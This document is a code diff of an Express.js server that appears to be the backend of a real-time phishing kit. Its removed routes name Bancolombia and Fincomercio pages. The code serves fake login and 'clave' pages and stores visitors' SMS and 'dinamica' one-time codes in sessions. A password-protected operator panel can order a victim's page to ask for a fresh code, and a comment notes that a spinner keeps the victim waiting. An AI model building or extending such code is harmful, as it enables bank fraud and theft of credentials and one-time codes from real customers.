@@ -1,9 +1,8 @@
-const express = require("express");
-const path = require("path");
-const fs = require("fs");
+const express = require('express');
+const path = require('path');
 const app = express();
 
-const PORT = Number(process.env.PORT) || 3000;
+const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
@@ -35,9 +34,24 @@ const authMiddleware = (req, res, next) => {
   return res.status(401).send('Invalid credentials');
 };
 
-// ==========================================
-// API DE SESIONES (COMPARTIDA)
-// ==========================================
+app.get('/', (req, res) => {
+  res.redirect('/login.html');
+});
+
+// Expose public static folders
+app.use('/css', express.static(path.join(__dirname, 'css')));
+app.use('/js', express.static(path.join(__dirname, 'js')));
+app.use('/assets', express.static(path.join(__dirname, 'assets')));
+
+// Expose public HTML files individually
+app.get('/login.html', (req, res) => res.sendFile(path.join(__dirname, 'login.html')));
+app.get('/clave.html', (req, res) => res.sendFile(path.join(__dirname, 'clave.html')));
+app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+
+// Protect and serve the /panel directory statically
+app.use('/panel', authMiddleware, express.static(path.join(__dirname, 'panel')));
+
+// In-memory sessions store
 let sessions = {};
 
 // 1. Create or update a session
@@ -102,6 +116,7 @@ app.post('/api/sessions/:id/token', (req, res) => {
   
   sessions[id].token = token;
   
+  // Set state based on current action (sms or dinamica) before clearing the action
   const currentAction = sessions[id].action;
   if (currentAction === 'sms') {
     sessions[id].state = 'received-sms';
@@ -109,7 +124,7 @@ app.post('/api/sessions/:id/token', (req, res) => {
     sessions[id].state = 'received-dinamica';
   }
   
-  sessions[id].action = null;
+  sessions[id].action = null; // Clear the action on the server so the spinner keeps showing!
   sessions[id].last_seen = Date.now();
   sessions[id].updatedAt = Date.now();
   res.json({ success: true, session: sessions[id] });
@@ -133,6 +148,7 @@ app.post('/api/sessions/:id/action', authMiddleware, (req, res) => {
   sessions[id].state = state || sessions[id].state;
   sessions[id].action = action;
   
+  // If requesting a new token input (dinamica or sms), reset the token
   if (action === 'dinamica' || action === 'sms') {
     sessions[id].token = '';
   }
@@ -160,45 +176,11 @@ app.post('/api/clear', authMiddleware, (req, res) => {
   res.json({ success: true });
 });
 
-// ==========================================
-// RUTAS Y RECURSOS ESTÁTICOS - PLAN A (BANCOLOMBIA)
-// ==========================================
-app.use('/plan-a/css', express.static(path.join(__dirname, 'plan-a/css')));
-app.use('/plan-a/js', express.static(path.join(__dirname, 'plan-a/js')));
-app.use('/plan-a/assets', express.static(path.join(__dirname, 'plan-a/assets')));
-
-app.get('/plan-a/login.html', (req, res) => res.sendFile(path.join(__dirname, 'plan-a/login.html')));
-app.get('/plan-a/clave.html', (req, res) => res.sendFile(path.join(__dirname, 'plan-a/clave.html')));
-app.get('/plan-a/index.html', (req, res) => res.sendFile(path.join(__dirname, 'plan-a/index.html')));
-
-app.use('/plan-a/panel', authMiddleware, express.static(path.join(__dirname, 'plan-a/panel')));
-
-app.get('/plan-a', (req, res) => res.redirect('/plan-a/login.html'));
-app.get('/plan-a/', (req, res) => res.redirect('/plan-a/login.html'));
-
-// ==========================================
-// RUTAS Y RECURSOS ESTÁTICOS - FINCOMERCIO
-// ==========================================
-app.use('/css', express.static(path.join(__dirname, 'css')));
-app.use('/js', express.static(path.join(__dirname, 'js')));
-app.use('/assets', express.static(path.join(__dirname, 'assets')));
-
-app.get('/canales.html', (req, res) => res.sendFile(path.join(__dirname, 'canales.html')));
-app.get('/portal.html', (req, res) => res.sendFile(path.join(__dirname, 'portal.html')));
-app.get('/recaudo.html', (req, res) => res.sendFile(path.join(__dirname, 'recaudo.html')));
-app.get('/index.html', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
-// Fallback genérico a index.html (evitando API y plan-a)
-app.get('*', (req, res, next) => {
-  if (req.path.startsWith('/api/') || req.path.startsWith('/plan-a/')) {
-    return next();
-  }
-  res.sendFile(path.join(__dirname, 'index.html'));
+// Fallback to login.html for root path
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'login.html'));
 });
 
-// Inicialización
 app.listen(PORT, () => {
-  console.log(`Unified server is running on port ${PORT}`);
+  console.log(`Server is running on port ${PORT}`);
 });
